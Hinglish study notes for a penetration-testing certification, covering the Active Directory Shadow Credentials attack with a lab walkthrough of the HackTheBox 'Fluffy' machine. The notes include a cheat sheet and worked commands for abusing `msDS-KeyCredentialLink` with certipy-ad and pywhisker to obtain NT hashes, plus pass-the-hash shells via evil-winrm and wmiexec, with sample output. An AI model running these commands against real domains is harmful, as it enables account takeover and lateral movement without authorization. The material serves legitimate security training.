# Shadow Credentials Attack (Hinglish Notes)

**Category:** AD ACL Abuse / Privilege Escalation
**CPTS Module:** Active Directory ACL Abuse

## Concept samjho

Dekho ye wala concept thoda mast hai. Agar tumhare paas kisi account pe `GenericWrite` ya `GenericAll` hai, ya specifically `msDS-KeyCredentialLink` attribute pe write access hai - to tum us account ka **password change kiye bina** ek apna khud ka "key credential" (basically ek fake certificate-based login method) us account pe register kar sakte ho. Fir tum PKINIT use karke us account ke naam ka Kerberos TGT maang sakte ho, aur usse uska NT hash nikal sakte ho.

**Ye itna powerful kyun hai:** password reset nahi karna padta (jo service break kar sakta tha ya alert bhej sakta tha), lockout ka bhi risk nahi, aur strong password bhi ho to koi farak nahi padta. Aur agar `msDS-KeyCredentialLink` writes specifically monitor nahi ho rahe (jo mostly nahi hote), to ye attack basically invisible hai.

## Tools ka roster

| Tool | Kaam | Type |
|---|---|---|
| `certipy-ad` | All-in-one - key credential likho, PKINIT karo, NT hash nikaalo | Attack/Exploit |
| `Whisker` (C#) | Windows-native version, same kaam karta hai | Attack/Exploit |
| `pywhisker` | Whisker ka Python port | Attack/Exploit |
| BloodHound | Pehle ye check karo ki kis pe tumhara GenericWrite/GenericAll hai | Enumeration (zaroori hai pehle) |

## Commands - cheat sheet

```bash
# Full automated attack - add karo, PKINIT se auth karo, NT hash nikalo, cleanup bhi khud kar deta hai
certipy-ad shadow auto -u '<controlled_user>@<domain>' -p '<password>' \
  -account '<target_account>' -dc-ip '<dc_ip>'

# pywhisker se equivalent
pywhisker.py -d <domain> -u '<controlled_user>' -p '<password>' \
  --target '<target_account>' --action add

# Recovered NT hash se lateral movement karo
evil-winrm -i <dc_ip> -u '<target_account>' -H '<ntlm_hash>'
wmiexec.py -hashes ':<ntlm_hash>' <domain>/<target_account>@<dc_ip>
```

## Practical Example - Fluffy (HTB) se seedha

BloodHound analysis (dekho `BloodHound-AD-Enumeration.md`) se pata chala `p.agila` **SERVICE ACCOUNTS** group mein tha, jiske paas `winrm_svc` pe `GenericWrite` tha.

**Writeup se ek dhyan dene wali baat:** us group mein khud ko add karna possible tha - ye dikhata hai ki group pe write rights kaise cascade hoti hain, group control karne ka matlab hai uske members bhi control karna.

```
net rpc group addmem "SERVICE ACCOUNTS" p.agila -U fluffy.htb/p.agila
[+] Successfully added p.agila to SERVICE ACCOUNTS
```

**Shadow credential attack chalaya** `winrm_svc` pe:

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'promXXXXXXXXXXX' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
```
**Sample output:**
```
[*] Targeting user 'WINRM_SVC'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Adding Key Credential with device ID '...' to the target object
[*] Successfully added Key Credential
[*] Authenticating as 'WINRM_SVC' with the certificate
[*] Got TGT
[*] NT hash for 'WINRM_SVC': aad3b435b51404eeaad3b435b51404ee:9f5a...c31
```

**Us hash se shell le liya:**

```bash
evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '<winrm_svc_hash>'
```
**Sample output:**
```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```
Isse `user.txt` flag mil gaya.

**Yaad rakhna:** Ye step humein low-priv AD user se seedha ek shell-granting service account tak le gaya - sirf ACL abuse se, koi password cracking involve nahi thi is step mein.
